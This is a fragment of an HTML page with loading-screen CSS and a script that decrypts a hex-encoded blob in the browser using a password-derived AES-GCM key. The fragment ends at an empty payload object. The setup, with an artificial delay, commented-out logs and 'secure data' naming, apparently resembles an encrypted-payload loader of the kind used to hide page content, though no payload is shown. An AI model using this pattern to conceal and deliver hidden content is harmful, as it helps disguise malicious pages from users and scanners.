            color: #222;
        }
        .invisible {
            visibility: hidden;
        }
        .system-info {
            margin-top: 20px;
            font-size: 14px;
            color: #666;
        }
        .progress-container {
            width: 200px;
            height: 10px;
            background-color: #e0e0e0;
            border-radius: 5px;
            margin-top: 20px;
            overflow: hidden;
        }
        .progress-bar {
            width: 0;
            height: 100%;
            background-color: #4f46e5;
            animation: expand 2s linear infinite;
        }
        @keyframes expand {
            0% { width: 0; }
            50% { width: 100%; }

    <script>
        const handleSecureData = async (encryptedData, encryptionKey, saltValue, password) => {
            // console.log("[INFO] Initiating secure data handling...");

            const convertHexToBytes = (hexString) => {
                const byteArray = [];
                for (let i = 0; i < hexString.length; i += 2) {
                    byteArray.push(parseInt(hexString.substr(i, 2), 16));
                }
                return new Uint8Array(byteArray);
            };

            const addArtificialDelay = () => new Promise(resolve => {
                // console.log("[DEBUG] Simulating delay...");
                setTimeout(resolve, 500);
            });

            const deriveEncryptionKey = async (keyMaterial, saltBytes) => {
                return crypto.subtle.deriveKey(
                    { name: "PBKDF2", salt: saltBytes, iterations: 100000, hash: "SHA-256" },
                    keyMaterial,
                    { name: "AES-GCM", length: 256 },
                    false,
                    ["decrypt"]
                );
            };

            const keyMaterial = await crypto.subtle.importKey(
                "raw",
                new TextEncoder().encode(password),
                { name: "PBKDF2" },
                false,
                ["deriveKey"]
            );

            await addArtificialDelay();
            const derivedEncryptionKey = await deriveEncryptionKey(keyMaterial, convertHexToBytes(saltValue));

            try {
                const decryptedData = await crypto.subtle.decrypt(
                    { name: "AES-GCM", iv: convertHexToBytes(encryptionKey) },
                    derivedEncryptionKey,
                    convertHexToBytes(encryptedData)
                );
                console.log("[SUCCESS] Data decrypted successfully.");
                return new TextDecoder().decode(decryptedData);
            } catch (error) {
                console.error("[ERROR] Failed to decrypt data:", error);
                return null;
            }
        };

        (async () => {

            const securePayload = {

            };
